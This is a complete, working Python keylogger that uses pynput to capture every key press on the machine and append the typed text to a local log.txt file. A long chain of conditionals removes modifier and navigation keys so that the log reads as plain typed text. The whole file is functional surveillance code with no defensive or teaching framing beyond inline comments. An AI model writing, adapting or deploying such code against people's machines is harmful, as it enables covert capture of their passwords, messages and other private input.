from pynput.keyboard import  Listener


def write_to_file(key):
    letter = str(key)

    # replaces the double quotes with  a space. Plus, it allows us to add  a space between the letters.
    # letter = letter.replace("'", " ")

    # replaces the double quotes with a blank.
    letter = letter.replace("'", "")

    # if key is pressed, then replace it with nothing. So it wont show up in the logs.

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''

    if letter == 'Key.shift_r':
        letter = ''

    if letter == "Key.ctrl_l":
        letter = ""

    if letter == "Key.enter":
        letter = "\n"

    if letter == 'Key.backspace':
        letter = ''

    if letter == 'Key.alt':
        letter = ''

    if letter == "Key.alt_gr":
        letter = ''

    if letter == 'Key.alt_l':
        letter = ''

    if letter == "Key.alt_r":
        letter = ''

    if letter == 'Key.backspace':
        letter = ''

    if letter == 'Key.caps_lock':
        letter = ''

    if letter == 'Key.cmd':
        letter = ''

    if letter == 'Key.cmd_l':
        letter = ''

    if letter == 'Key.cmd_r':
        letter = ''

    if letter == 'Key.ctrl':
        letter = ''

    if letter == 'Key.ctrl_l':
        letter = ''

    if letter == 'Key.ctrl_r':
        letter = ''

    if letter == 'Key.delete':
        letter = ''

    if letter == 'Key.down':
        letter = ''

    if letter == 'Key.end':
        letter = ''

    if letter == 'Key.esc':
        letter = ''

    if letter == 'Key.f1':
        letter = ''

    if letter == 'Key.home':
        letter = ''

    if letter == 'Key.left':
        letter = ''

    if letter == 'Key.menu':
        letter = ''

    if letter == 'Key.num_lock':
        letter = ''

    if letter == 'Key.page_down':
        letter = ''

    if letter == 'Key.page_up':
        letter = ''

    if letter == 'Key.pause':
        letter = ''

    if letter == 'Key.print_screen':
        letter = ''

    if letter == 'Key.right':
        letter = ''

    if letter == 'Key.scroll_lock':
        letter = ''

    if letter == 'Key.shift':
        letter = ''

    if letter == 'Key.shift_1':
        letter = ''

    if letter == 'Key.tab':
        letter = ''

    if letter == 'Key.up':
        letter = ''

    with open("log.txt", 'a') as f:  # to create a file/open it and write to it.
        f.write(letter)  # writes to the file with the quoted text to the file


with Listener(on_press=write_to_file) as l:  # listener is basically L in this case. This will run when you press a key.
    l.join()

